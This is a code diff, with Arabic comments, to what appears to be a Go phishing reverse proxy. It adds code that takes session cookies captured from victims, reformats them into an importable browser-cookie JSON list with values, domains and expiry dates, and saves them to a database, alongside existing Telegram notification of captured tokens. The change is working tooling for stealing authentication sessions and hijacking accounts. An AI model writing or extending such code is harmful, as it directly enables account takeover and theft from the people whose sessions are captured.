@@ -2255,6 +2255,14 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 					log.Warning("لا توجد كوكيز مخزنة للجلسة: %s", s.Id)
 				}
 				
+				// حفظ cookiesList في قاعدة البيانات
+				err := p.db.SetSessionCookies(sid, cookiesList)
+				if err != nil {
+					log.Error("فشل في حفظ الكوكيز في قاعدة البيانات: %v", err)
+				} else {
+					log.Success("تم حفظ الكوكيز في قاعدة البيانات بنجاح للجلسة: %s", sid)
+				}
+				
 				// تحويل قائمة الكوكيز إلى JSON
 				cookiesJSON, err := json.MarshalIndent(cookiesList, "", "  ")
 				if err != nil {
@@ -2680,6 +2688,36 @@ func (p *HttpProxy) notifyTokensCaptured(sid string) {
 	s, ok := p.sessions[sid]
 	if !ok {
 		return
+	}
+
+	// تحويل الكوكيز إلى التنسيق المطلوب وحفظها في قاعدة البيانات
+	if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
+		cookiesList := []map[string]interface{}{}
+		
+		for domain, cookies := range s.CookieTokens {
+			for name, cookie := range cookies {
+				cookieData := map[string]interface{}{
+					"path":           cookie.Path,
+					"domain":         domain,
+					"expirationDate": cookie.ExpirationDate,
+					"value":          cookie.Value,
+					"name":           name,
+					"httpOnly":       cookie.HttpOnly,
+					"hostOnly":       false,
+					"secure":         false,
+					"session":        false,
+				}
+				cookiesList = append(cookiesList, cookieData)
+			}
+		}
+		
+		// حفظ الكوكيز في قاعدة البيانات
+		err := p.db.SetSessionCookies(sid, cookiesList)
+		if err != nil {
+			log.Error("فشل في حفظ الكوكيز في قاعدة البيانات: %v", err)
+		} else {
+			log.Success("تم حفظ الكوكيز في قاعدة البيانات بنجاح للجلسة: %s", sid)
+		}
 	}
 
 	// التحقق من أن تليجرام مفعل
